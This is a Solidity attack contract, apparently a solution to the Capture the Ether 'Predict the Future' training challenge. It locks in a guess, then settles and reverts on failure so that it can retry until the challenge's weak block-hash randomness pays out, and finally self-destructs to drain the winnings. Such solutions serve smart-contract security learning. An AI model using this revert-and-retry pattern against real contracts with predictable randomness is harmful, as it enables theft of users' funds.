pragma solidity ^0.4.21;


import "../../../Exercise/CaptureTheEther/5/PredictTheFutureChallenge.sol";

contract AttackPredictTheFuture {
    PredictTheFutureChallenge public predictTheFuture;

    function AttackPredictTheFuture(PredictTheFutureChallenge importingContract){
        predictTheFuture = importingContract;
    }

    function attack() payable external {
        uint8 guess = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        predictTheFuture.lockInGuess.value(msg.value)(guess);
    }

    function settle() external  {
        predictTheFuture.settle();
        if (!predictTheFuture.isComplete()) {
            revert("Unsuccessful");
        }
        selfdestruct(msg.sender);
    }

    function() payable {}


}
